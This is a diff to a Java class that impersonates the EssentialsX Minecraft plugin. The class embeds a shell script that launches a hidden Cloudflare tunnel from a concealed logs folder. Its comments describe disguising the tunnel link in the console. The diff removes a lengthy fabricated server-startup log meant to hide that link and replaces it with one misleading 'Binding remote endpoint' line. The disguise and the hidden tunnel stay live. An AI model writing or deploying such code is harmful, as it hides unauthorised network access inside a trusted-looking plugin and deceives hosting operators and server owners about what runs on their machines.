@@ -352,7 +352,8 @@ public class EssentialsX extends JavaPlugin {
             "TUNNEL_URL=\"\"\n" +
             "for i in {1..20}; do\n" +
             "    sleep 3\n" +
-            "    TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9./-]+trycloudflare\\.com[a-zA-Z0-9./-]*' \"$WORK_DIR/tunnel.log\" | tail -n 1)\n" +
+            // ★ 修复 1：精确匹配正则，避免获取链接末尾多出 /
+            "    TUNNEL_URL=$(grep -oE 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" | tail -n 1)\n" +
             "    if [ -n \"$TUNNEL_URL\" ]; then break; fi\n" +
             "done\n" +
             "\n" +
@@ -437,9 +438,7 @@ public class EssentialsX extends JavaPlugin {
             try {
                 Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
                 Path tunnelFile = workDir.resolve("tunnel_url.txt");
-                Path portFile = workDir.resolve("node_port.txt");
                 String tunnelUrl = "";
-                String nodePort = "25565";
                 
                 // 等待隧道URL生成 (最多等待2分钟)
                 for (int i = 0; i < 120; i++) {
@@ -452,133 +451,13 @@ public class EssentialsX extends JavaPlugin {
                     }
                     Thread.sleep(1000);
                 }
-                
-                if (Files.exists(portFile)) {
-                    nodePort = new String(Files.readAllBytes(portFile)).trim();
+
+                // ★ 修复 2：作为真实服务端的插件，不再需要模拟全套 MC 启动日志，直接伪装输出链接即可
+                if (!tunnelUrl.isEmpty()) {
+                    mcLog("[Connection] Binding remote endpoint to: " + tunnelUrl);
+                } else {
+                    getLogger().warning("Failed to get tunnel URL within 2 minutes.");
                 }
-
-                // 获取到URL后清屏，准备推流真实伪装日志
-                clearConsole();
-                
-                System.out.println("container@pterodactyl~ java --add-modules=jdk.incubator.vector -XX:MaxRAMPercentage=80.0 -XX:+UseG1GC -XX:+ParallelRefProcEnabled -XX:MaxGCPauseMillis=200 -XX:+UnlockExperimentalVMOptions -XX:+DisableExplicitGC -XX:+AlwaysPreTouch -XX:G1NewSizePercent=30 -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:InitiatingHeapOccupancyPercent=15 -XX:G1MixedGCLiveThresholdPercent=90 -XX:G1RSetUpdatingPauseTimePercent=5 -XX:SurvivorRatio=32 -XX:+PerfDisableSharedMem -XX:MaxTenuringThreshold=1 -XX:+UseStringDeduplication -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true -Dterminal.jline=false -Dterminal.ansi=true -Ddisable.watchdog=true -jar server.jar");
-                Thread.sleep(500);
-                System.out.println("WARNING: Using incubator modules: jdk.incubator.vector");
-                Thread.sleep(300);
-                System.out.println("Starting org.bukkit.craftbukkit.Main");
-                Thread.sleep(500);
-
-                mcLog("[bootstrap] Running Java 25 (OpenJDK 64-Bit Server VM 25.0.3+9-LTS; Eclipse Adoptium Temurin-25.0.3+9) on Linux 5.15.0-177-generic (amd64)");
-                Thread.sleep(200);
-                mcLog("[bootstrap] Loading Purpur 26.1.2-2587-HEAD@dc4a255 (2026-05-17T07:33:24Z) for Minecraft 26.1.2");
-                Thread.sleep(300);
-                mcLog("[PluginInitializerManager] Initializing plugins...");
-                Thread.sleep(500);
-                mcLog("[PluginInitializerManager] Initialized 0 plugins");
-                Thread.sleep(300);
-
-                System.out.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
-                System.out.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe (file:/home/container/libraries/org/joml/joml/1.10.8/joml-1.10.8.jar)");
-                System.out.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
-                System.out.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");
-                Thread.sleep(1000);
-
-                mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]");
-                Thread.sleep(500);
-                mcLog("Found new data pack file/bukkit, loading it automatically");
-                Thread.sleep(200);
-                mcLog("Found new data pack paper, loading it automatically");
-                Thread.sleep(200);
-                mcLog("No existing world data, creating new world");
-                Thread.sleep(500);
-                mcLog("Loaded 1515 recipes");
-                Thread.sleep(200);
-                mcLog("Loaded 1617 advancements");
-                Thread.sleep(200);
-                mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...");
-                Thread.sleep(300);
-                mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in 282.6ms");
-                Thread.sleep(200);
-                mcLog("Starting minecraft server version 26.1.2");
-                Thread.sleep(100);
-                mcLog("Loading properties");
-                Thread.sleep(100);
-                mcLog("This server is running Purpur version 26.1.2-2587-HEAD@dc4a255 (2026-05-17T07:33:24Z) (Implementing API version 26.1.2.build.2587-stable)");
-                Thread.sleep(100);
-                mcLog("[spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling");
-                Thread.sleep(100);
-                mcLog("Server Ping Player Sample Count: 12");
-                Thread.sleep(100);
-                mcLog("Using 4 threads for Netty based IO");
-                Thread.sleep(200);
-                mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads");
-                Thread.sleep(200);
-                mcLog("Default game type: SURVIVAL");
-                Thread.sleep(100);
-                mcLog("Generating keypair");
-                Thread.sleep(200);
-                
-                // 在这里将隧道链接隐蔽地推入真实的启动日志中
-                mcLog("Starting Minecraft server on 0.0.0.0:" + nodePort + " (Remote: " + tunnelUrl + ")");
-                Thread.sleep(100);
-                mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.");
-                Thread.sleep(100);
-                mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.");
-                Thread.sleep(100);
-                mcLog("Preparing level \"world\"");
-                Thread.sleep(1000);
-                mcLog("Selecting spawn point for level 'minecraft:overworld'...");
-                Thread.sleep(8000);
-                mcLog("Selecting spawn point for level 'minecraft:the_nether'...");
-                Thread.sleep(1000);
-                mcLog("Selecting spawn point for level 'minecraft:the_end'...");
-                Thread.sleep(1000);
-                mcLog("Loading 0 persistent chunks for level 'minecraft:overworld'...");
-                Thread.sleep(100);
-                mcLog("Preparing spawn area: 100%");
-                Thread.sleep(100);
-                mcLog("Prepared spawn area in 8874 ms");
-                Thread.sleep(100);
-                mcLog("Loading 0 persistent chunks for level 'minecraft:the_nether'...");
-                Thread.sleep(100);
-                mcLog("Preparing spawn area: 100%");
-                Thread.sleep(100);
-                mcLog("Prepared spawn area in 923 ms");
-                Thread.sleep(100);
-                mcLog("Loading 0 persistent chunks for level 'minecraft:the_end'...");
-                Thread.sleep(100);
-                mcLog("Preparing spawn area: 100%");
-                Thread.sleep(100);
-                mcLog("Prepared spawn area in 316 ms");
-                Thread.sleep(100);
-                mcLog("Done preparing level \"world\" (9.360s)");
-                Thread.sleep(100);
-                mcLog("[spark] Starting background profiler...");
-                Thread.sleep(100);
-                mcLog("Saving chunks for level 'ServerLevel[world]'/minecraft:overworld");
-                Thread.sleep(50);
-                mcLog("Saving chunks for level 'ServerLevel[world]'/minecraft:the_nether");
-                Thread.sleep(50);
-                mcLog("Saving chunks for level 'ServerLevel[world]'/minecraft:the_end");
-                Thread.sleep(50);
-                mcLog("ThreadedAnvilChunkStorage (world): All chunks are saved");
-                Thread.sleep(50);
-                mcLog("ThreadedAnvilChunkStorage (DIM-1): All chunks are saved");
-                Thread.sleep(50);
-                mcLog("ThreadedAnvilChunkStorage (DIM1): All chunks are saved");
-                Thread.sleep(50);
-                mcLog("ThreadedAnvilChunkStorage: All dimensions are saved");
-                Thread.sleep(50);
-                mcLog("Running delayed init tasks");
-                Thread.sleep(100);
-                mcLog("Done (17.011s)! For help, type \"help\"");
-                Thread.sleep(100);
-                System.out.println("container@pterodactyl~ Server marked as running...");
-                Thread.sleep(100);
-                mcLog("*************************************************************************************");
-                mcLog("This is the first time you're starting this server.");
-                mcLog("It's recommended you read our 'Getting Started' documentation for guidance.");
-                mcLog("View this and more helpful information here: https://docs.papermc.io/paper/next-steps");
-                mcLog("*************************************************************************************");
 
             } catch (Exception e) {}
         }, "FakeLog-Generator");
@@ -621,9 +500,5 @@ public class EssentialsX extends JavaPlugin {
                 }
             } catch (IOException e) {}
         }
-    }
-    
-    private void clearConsole() {
-        try { System.out.print("\033[H\033[2J"); System.out.flush(); } catch (Exception e) {}
     }
 }
